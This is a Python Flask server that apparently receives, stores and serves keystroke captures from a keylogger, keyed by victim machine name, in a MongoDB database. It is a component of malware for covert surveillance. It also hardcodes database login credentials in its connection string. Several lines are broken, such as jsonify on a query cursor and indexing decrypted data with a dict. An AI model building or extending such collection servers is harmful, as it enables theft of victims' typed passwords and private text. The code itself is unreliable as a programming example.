from flask import Flask, request, jsonify
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi

app = Flask(__name__)
URI = "mongodb+srv://ishaicohen125:Aa12345@cluster0.z4ssc0b.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"

from keylogger import Encryptor

@app.route("/api", methods=["GET", "POST"])
def home():
    client = MongoClient(URI, server_api=ServerApi("1"))
    db = client["key_logger"]
    db_collection = db["KeyLogger"]

    if request.method == "POST":
        data = request.get_json()
        exited_data = jsonify(db_collection.find({"machine_name": data["machine_name"]}))

        if exited_data:
            print("found!")
        # if there is data from that computer
        encryptor = Encryptor()
        decrypted_data = encryptor.xor(exited_data.data)
        if decrypted_data:
            for time in decrypted_data[data]:
                pass

        if data and "machine_name" in data and "data" in data:
            db_collection.insert_one(data)
            return jsonify({"message": "Data sent successfully!"}), 201
        print("Error")
        return jsonify({"Error ": "Invalid data"}), 400
    elif request.method == "GET":
        all_data = db_collection.find()
        return jsonify(all_data), 200

if __name__ == "__main__":
    app.run(debug=True)
